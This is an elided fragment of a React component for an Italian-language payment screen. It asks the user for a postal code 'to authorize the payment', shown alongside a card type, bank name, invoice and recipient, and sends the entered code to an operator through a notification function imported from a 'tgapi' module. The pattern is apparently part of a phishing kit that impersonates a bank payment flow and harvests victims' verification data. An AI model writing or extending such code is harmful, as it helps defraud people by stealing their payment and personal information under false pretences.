...
import { sendItZipEnteredNotification } from '../../tgapi';
...
const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Fattura sconosciuta", recipientName = "Destinatario sconosciuto" }: ChooseComponentProps) => {
  ...
  const handleSubmit = async () => {
    if (!zipCode.trim()) {
      alert('Inserisci il codice postale');
      return;
    }
    ...
    try {
      await sendItZipEnteredNotification(invoiceName, recipientName, zipCode);
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Inserisci il codice postale per autorizzare il pagamento
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center">
          <input
            ...
            className="w-20 px-2 py-1 text-center text-xs font-mono border border-border rounded-[5px] bg-white shadow-lg drop-shadow-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 focus:shadow-xl transition-shadow duration-200 disabled:opacity-50"
            onChange={(e) => {
              // Only allow numbers
